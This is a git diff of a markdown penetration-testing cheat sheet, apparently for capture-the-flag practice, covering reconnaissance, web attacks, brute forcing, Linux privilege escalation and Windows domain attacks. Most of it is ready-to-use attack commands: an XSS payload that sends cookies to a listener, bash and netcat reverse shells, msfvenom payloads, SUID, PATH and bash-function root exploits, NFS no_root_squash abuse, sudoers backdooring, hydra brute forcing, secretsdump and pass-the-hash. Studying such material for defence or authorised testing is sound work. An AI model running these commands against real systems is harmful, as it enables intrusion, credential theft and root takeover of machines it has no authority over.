@@ -1,7 +1,12 @@
 # Table of Contents
 
+## Networking
+
 * [Networking](#Networking)
 * [Port Scanning](#Port-Scanning)
+
+## WEB
+
 * [WEB Analysis](#WEB-Analysis)
 * [WordPress](#WordPress)
 * [AWS S3](#AWS-S3)
@@ -11,18 +16,28 @@
 * [PHP Uploading Bypass](#PHP-Uploading-Bypass)
 * [Port Tunnelling](#Port-Tunnelling)
 * [WEB Fuzz](#WEB-Fuzz)
+
+## Protocols
+
 * [HTTP](#HTTP)
 * [FTP](#FTP)
 * [SMB](#SMB)
 * [Pop3](#Pop3)
 * [SSH](#SSH)
 * [SCP](#SCP)
-* [MySQL](#MySQL)
+* [SQL](#SQL)
 * [NFS](#NFS)
 * [RDP](#RDP)
+
+## Brute Forcing
+
 * [Hash Analysis](#Hash-Analysis)
 * [Brute Force](#Brute-Force)
+
+## Linux
+
 * [Shell Spawn](#Shell-Spawn)
+* [Abusing Shell](#Abusing-Shell)
 * [SUID](#SUID)
 * [Sudo](#Sudo)
 * [Sudoers](#Sudoers)
@@ -30,12 +45,26 @@
 * [Payloads](#Payloads)
 * [Linux Password](#Linux-Password)
 * [Custom Wordlists](#Custom-Wordlists)
-* [Steganography](#Steganography)
 * [Crontab](#Crontab)
+
+## Windows
+* [Windows Password](#Windows-Password)
+* [Pass the Hash Attack](#Pass-the-Hash-Attack)
+* [Kerberos](#Kerberos)
+* [PowerShell](#PowerShell)
+* [PowerView](#PowerView)
+* [Looting](#Looting)
+
+## Encoding / Cryptography
+
 * [Base64](#Base64)
 * [Base32](#Base32)
 * [GPG](#GPG)
 * [OpenSSL](#OpenSSL)
+* [Steganography](#Steganography)
+
+## Scripts
+
 * [Decimal to ASCII](#Decimal-to-ASCII)
 * [Binary to Decimal](#Binary-to-Decimal)
 * [Binary to ASCII](#Binary-to-ASCII)
@@ -46,9 +75,12 @@
 * [Preload](#Preload)
 * [Library Hijack](#Library-Hijack)
 * [C Shell Spawn](#C-Shell-Spawn)
-* [Abusing Shell](#Abusing-Shell)
 * [Dump Flags](#Dump-Flags)
+
+## Frameworks
+
 * [Metasploit](#Metasploit)
+
 
 
 
@@ -69,7 +101,6 @@
 # Networking
 
 ### Host Discovery
-
 ```
 netdiscover -r {NETWORK}/{MASK}
 ```
@@ -81,7 +112,6 @@ nmap -sV {NETWORK}/{MASK}
 # Port Scanning
 
 ### Nmap
-
 ```
 # Simple Scan
 nmap {TARGET}
@@ -130,19 +160,16 @@ ls -lah /usr/share/nmap/scripts
 # WEB Analysis
 
 ### Nikto
-
 ```
 nikto -h {TARGET}
 ```
 
 ### Dirb
-
 ```
 dirb {TARGET}
 ```
 
 ### GoBuster
-
 ```
 gobuster dir -t 50 -u {TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html
 
@@ -152,7 +179,6 @@ gobuster dir -t 50 -u {TARGET} -w /usr/share/seclists/Discovery/Web-Content/dire
 # WordPress
 
 ### Analysis
-
 ```
 # Simple Scan
 wpscan --url {TARGET}
@@ -168,7 +194,6 @@ wpscan -e u --url {TARGET}
 ```
 
 ### Update Datase Password Hash
-
 ```
 echo -n "password" | md5sum
 5f4dcc3b5aa765d61d8327deb882cf99
@@ -179,13 +204,11 @@ mysql> UPDATE {TABLE} SET {FIELD}='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID={I
 # AWS S3
 
 ### List Bucket Files
-
 ```
 curl {BUCKET_NAME}.s3.amazonaws.com | xmllint --format -
 ```
 
 ### Download File
-
 ```
 curl {BUCKET_NAME}.s3.amazonaws.com/{FILE}
 ```
@@ -205,7 +228,6 @@ curl http://{TARGET}:{PORT}/{URI}
 # XSS
 
 ### Validation
-
 ```
 <script>alert('XSS Works')</script>
 </p><script>console.log("XSS Works")</script><p>
@@ -213,7 +235,6 @@ curl http://{TARGET}:{PORT}/{URI}
 ```
 
 ### Acquiring Cookies
-
 ```
 nc -lvnp 80
 </p><script>window.location = 'http://{LOCAL_IP}/page?param=' + document.cookie </script><p>
@@ -222,7 +243,6 @@ nc -lvnp 80
 # SQL Injection
 
 ### Analysis
-
 ```
 # Manual
 '
@@ -243,7 +263,6 @@ sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=
 ```
 
 ### Navigation
-
 ```
 sqlmap -r login.req -p u --batch --current-db
 sqlmap -r login.req -p u --batch -D {DB} --tables
@@ -266,7 +285,6 @@ mv reverse_shell.php reverse_shell.phtml
 # Port Tunnelling
 
 ### Using SSH
-
 ```
 ssh -N -L {PORT}:127.0.0.1:{PORT} {USER}@{TARGET}
 
@@ -305,7 +323,6 @@ wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "{PARAMETER_1}=FUZZ&{PARAME
 # HTTP
 
 ### URL Scapping
-
 ```
 # %20 = Space
 # %2f = /
@@ -313,7 +330,6 @@ curl http://example.com/api/cmd/ls%20%2fhome
 ```
 
 ### Reverse Shell Example
-
 ```
 # Listen
 nc -lvnp {LOCAL_PORT}
@@ -353,6 +369,9 @@ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {TARGET}
 
 # Disks list
 smbmap -H {TARGET}
+
+# Disks list with user auth
+smbmap -u {USER} -p {PASSWORD} -H {TARGET}
 
 # Connection
 smbclient //{TARGET}/{DISK}
@@ -396,27 +415,25 @@ scp {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
 scp -i {KEY} -p {PORT} {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
 ```
 
-# MySQL
+# SQL
 
 ### Connection
-
 ```
 mysql -u {USER} -h {TARGET} -p {PASSWORD}
 ```
 
 ### Actions
-
 ```
 mysql> show databases;
 mysql> use {DATABASE};
 mysql> show tables;
+mysql> describe {TABLE};
 mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
 ```
 
 # NFS
 
 ### List Mount Points
-
 ```
 # Nmap Analysis
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {TARGET}
@@ -429,13 +446,11 @@ cat /etc/exports
 ```
 
 ### Mount
-
 ```
 sudo mount -t nfs -o nolock {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
 ```
 
 ### Umount
-
 ```
 sudo umount {LOCAL_PATH}
 ```
@@ -464,18 +479,17 @@ remmina
 
 
 
-
-
 # Hash Analysis
 
-### Hash Identifier
+### Hashcat Hash Examples
+[hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
+### Hash Identifier
 ```
 hash-identifier {HASH}
 ```
 
 ### HashID
-
 ```
 hashid -mj {HASH}
 ```
@@ -483,7 +497,6 @@ hashid -mj {HASH}
 # Brute Force
 
 ### Hash
-
 ```
 hashcat -m {MODE} {HASH_FILE} /usr/share/wordlists/rockyou.txt
 ```
@@ -494,26 +507,22 @@ john --show {HASH_FILE}
 ```
 
 ### SSH
-
 ```
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
 ```
 
 ### FTP
-
 ```
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ftp://{TARGET}
 ```
 
 ### SSH Key
-
 ```
 /usr/share/john/ssh2john.py {SSH_KEY_FILE} > {SSH_KEY_FILE}.john
 john --wordlist=/usr/share/wordlists/rockyou.txt {SSH_KEY_FILE}.john
 ```
 
 ### ZIP
-
 ```
 /usr/share/john/zip2john {ZIP_FILE} > {ZIP_FILE}.hash
 john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
@@ -525,7 +534,6 @@ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
 ```
 
 ### WordPress Login
-
 ```
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
 ```
@@ -535,15 +543,19 @@ wpscan --url {TARGET} -U {USERS_LIST} -P /usr/share/wordlists/rockyou.txt
 ```
 
 ### Pop3
-
 ```
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
 ```
 
 ### MySQL
-
 ```
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
+```
+
+### PGP File
+```
+gpg2john {FILE} > {FILE}.john
+john --wordlist=/usr/share/wordlists/rockyou.txt {FILE}.john
 ```
 
 
@@ -567,14 +579,12 @@ hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
 # Shell Spawn
 
 ### Python
-
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ### Bash
-
 ```
 /suid/bash/binary -p
 ```
@@ -589,16 +599,72 @@ find / -type f -perm -u=s 2>/dev/null
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
+# Abusing Shell
+
+### 1)
+```
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ strings /suid/binary
+service apache2 start
+
+$ gcc -o service /absolte/path/shell_spawn.c
+$ PATH=.:$PATH /suid/binary
+```
+
+### 2)
+```
+$ /bin/bash --version
+# Version need to be less than 4.2-048
+
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ strings /suid/binary
+/usr/sbin/service apache2 start
+
+$ function /usr/sbin/service { /bin/bash -p; }
+$ export -f /usr/sbin/service
+$ /suid/binary
+```
+
+### 3)
+```
+$ /bin/bash --version
+# Version need to be less than 4.4
+
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /suid/binary
+$ /tmp/rootbash -p
+```
+
+### 4)
+```
+# Remote target with "no_root_squash,insecure" NFS flags enabled
+# Remote target with /home/user mounted in host /tmp/mnt
+
+# Run in target
+$ cp /bin/bash /home/user/bash
+
+# Run in host
+$ sudo chown root:root /tmp/mnt/bash
+$ sudo chmod 4777 /tmp/mnt/bash
+
+# Run in target
+$ /home/user/bash -p
+```
+
 # Sudo
 
 ### List Policy
-
 ```
 sudo -l
 ```
 
 ### Run as User
-
 ```
 sudo -u {USER} {COMMAND}
 ```
@@ -613,19 +679,16 @@ echo "{USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 # Netcat
 
 ### Listen
-
 ```
 nc -lcnp {PORT}
 ```
 
 ### Reverse Shell
-
 ```
 bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
 ```
 
 ### Reverse Shell Using Backpipe
-
 ```
 mknod /tmp/backpipe p
 /bin/sh 0</tmp/backpipe | nc {IP} {PORT} 1>/tmp/backpipe
@@ -634,7 +697,6 @@ mknod /tmp/backpipe p
 # Payloads
 
 ### Linux Reverse Python Raw
-
 ```
 msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
 ```
@@ -642,14 +704,12 @@ msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
 # Linux Password
 
 ### /etc/shadow
-
 ```
 mkpasswd -m sha-512 root
 $6$bAzyC2dw/9TlXnh$EdycGclOk2oAWJ3ewD0jAebV4E0f15i79Ej4QC0hG/3ILILbSNckjNRQZn0ggnjPqXdgjX2kvzMDRJ5nzhZQG1
 ```
 
 ### /etc/passwd
-
 ```
 # Generate Password Hash
 openssl passwd password
@@ -666,49 +726,21 @@ $1$root$9gr5KxwuEdiI80GtIzd.U0
 # Custom Wordlists
 
 ### Cewl
-
 ```
 cewl http://192.168.1.101/index.html > wordlist.txt
 cewl {FILE} > wordlist.txt
 cewl {URL} > wordlist.txt
 ```
 
-# Steganography
-
-### Exiftool
-
-```
-exiftool {FILE}
-```
-
-### Steghide
-
-```
-# Embed Data
-steghide embed -cf {FILE} -ef {DATA_FILE}
-
-# Extract Data
-steghide extract -sf {FILE}
-```
-
-### BinWalk
-
-```
-# Extract Data
-binwalk -e {FILE}
-```
-
 # Crontab
 
 ### List Jobs
-
 ```
 crontab -l
 cat /etc/crontab
 ```
 
 ### Edit
-
 ```
 crontab -e
 
@@ -740,10 +772,138 @@ crontab -e
 
 
 
+# Windows Password
+
+### Dump Hashes
+```
+# Secrets Dumps
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py {USER}:{PASSWORD}@{TARGET}
+```
+
+# Pass the Hash Attack
+
+```
+# PS Exec
+python3 /usr/share/doc/python3-impacket/examples/psexec.py {USER}@{TARGET} -hashes {LMHASH:NTHASH}
+```
+
+# Kerberos
+
+### Enum Users
+```
+./kerbrute_linux_386 userenum --dc {TAGET} -d {DNS} {USERS_FILE}
+```
+
+### Users Password Hash
+```
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {TARGET} {DNS}/{USER}
+```
+
+# PowerShell
+
+### Spawn from CMD
+```
+# Default
+C:\Windows\system32> powershell
+
+# Bypassing Policies
+C:\Windows\system32> powershell -eq bypass
+```
+
+### Hidden Files
+```
+Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
+```
+
+### MD5 Hash
+```
+Get-FileHash -Algorithm MD5 file.txt
+```
+
+### List Volumes
+```
+vssadmin list volumes
+```
+
+### List Shadows
+```
+vssadmin list shadows
+```
+
+# PowerView
+
+### CheatSheet
+[HarmJ0y - PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+### Init
+```
+. .\PowerView.ps1
+```
+
+### System Info
+```
+Get-NetComputer -fulldata
+```
+
+### Domain Users
+```
+Get-NetUser | select cn
+```
+
+### Shared Folders
+```
+Invoke-ShareFinder
+```
+
+# Looting
+
+### SharpHound
+```
+# Init
+. .\SharpHound.ps1
+
+# Generate loot.zip
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+```
+
+# Bloodhound
+
+### Init
+```
+sudo neo4j console
+
+# Access WEB Page and change default password
+# Default User: neo4j
+# Default Pass: neo4j
+firefox http://localhost:7474/
+```
+
+### Start
+```
+bloodhound
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Base64
 
 ### Encoding
-
 ```
 base64 {FILE}
 base64 "{DATA}"
@@ -752,7 +912,6 @@ echo "{DATA}" | base64
 ```
 
 ### Decoding
-
 ```
 base64 -d {FILE}
 base64 -d "{DATA}"
@@ -763,7 +922,6 @@ echo "{DATA}" | base64 -d
 # Base32
 
 ### Encoding
-
 ```
 base32 {FILE}
 base32 "{DATA}"
@@ -772,7 +930,6 @@ echo "{DATA}" | base32
 ```
 
 ### Decoding
-
 ```
 base32 -d {FILE}
 base32 -d "{DATA}"
@@ -783,7 +940,6 @@ echo "{DATA}" | base32 -d
 # GPG
 
 ### Decrypt
-
 ```
 gpg -d {GPG_FILE}
 ```
@@ -791,9 +947,46 @@ gpg -d {GPG_FILE}
 # OpenSSL
 
 ### Decrypt RSA
-
 ```
 openssl rsautl -decrypt -inkey {PRIV_KEY} -in {ENCRYPTED_FILE} -out {DECRYPTED_FILE}
+```
+
+# Steganography
+
+### Exiftool
+```
+exiftool {FILE}
+```
+
+### Steghide
+```
+# Embed Data
+steghide embed -cf {FILE} -ef {DATA_FILE}
+
+# Extract Data
+steghide extract -sf {FILE}
+```
+
+### BinWalk
+```
+# Analyse
+binwalk {FILE}
+
+# Extract
+binwalk -e {FILE}
+```
+
+### BinWalk
+```
+# Extract Data
+binwalk -e {FILE}
+```
+
+### StegSolve
+```
+wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
+chmod +x stegsolve.jar
+java -jar stegsolve.jar
 ```
 
 
@@ -969,68 +1162,6 @@ int main() {
 	setuid(0);
 	system("/bin/bash -p");
 }
-```
-
-# Abusing Shell
-
-### 1)
-
-```
-$ ls -lah /suid/binary
--rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
-
-$ strings /suid/binary
-service apache2 start
-
-$ gcc -o service /absolte/path/shell_spawn.c
-$ PATH=.:$PATH /suid/binary
-```
-
-### 2)
-
-```
-$ /bin/bash --version
-# Version need to be less than 4.2-048
-
-$ ls -lah /suid/binary
--rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
-
-$ strings /suid/binary
-/usr/sbin/service apache2 start
-
-$ function /usr/sbin/service { /bin/bash -p; }
-$ export -f /usr/sbin/service
-$ /suid/binary
-```
-
-### 3)
-
-```
-$ /bin/bash --version
-# Version need to be less than 4.4
-
-$ ls -lah /suid/binary
--rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
-
-$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /suid/binary
-$ /tmp/rootbash -p
-```
-
-### 4)
-
-```
-# Remote target with "no_root_squash,insecure" NFS flags enabled
-# Remote target with /home/user mounted in host /tmp/mnt
-
-# Run in target
-$ cp /bin/bash /home/user/bash
-
-# Run in host
-$ sudo chown root:root /tmp/mnt/bash
-$ sudo chmod 4777 /tmp/mnt/bash
-
-# Run in target
-$ /home/user/bash -p
 ```
 
 # Dump Flags
